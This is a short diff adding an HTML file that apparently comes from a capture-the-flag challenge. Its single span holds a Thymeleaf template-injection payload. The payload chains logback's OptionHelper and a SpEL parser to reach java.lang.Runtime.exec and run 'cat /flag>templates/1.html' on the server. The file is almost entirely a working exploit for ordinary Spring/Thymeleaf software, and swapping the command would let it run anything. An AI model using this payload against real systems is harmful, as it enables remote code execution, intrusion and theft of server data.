@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+</head>
+<body>
+<p>
+    <span th:text="${T(ch.qos.logback.core.util.OptionHelper).instantiateByClassName(&quot;org.springframework.expression.spel.standard.SpelExpressionParser&quot;,&quot;&quot;.getClass().getSuperclass(),T(ch.qos.logback.core.util.OptionHelper).getClassLoader()).parseExpression(&quot;T(java.lang.String).forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;cat /flag>templates/1.html&#39;)&quot;).getValue()}">[NOT EVALUATED]</span>
+
+</p>
+</body>
+</html>
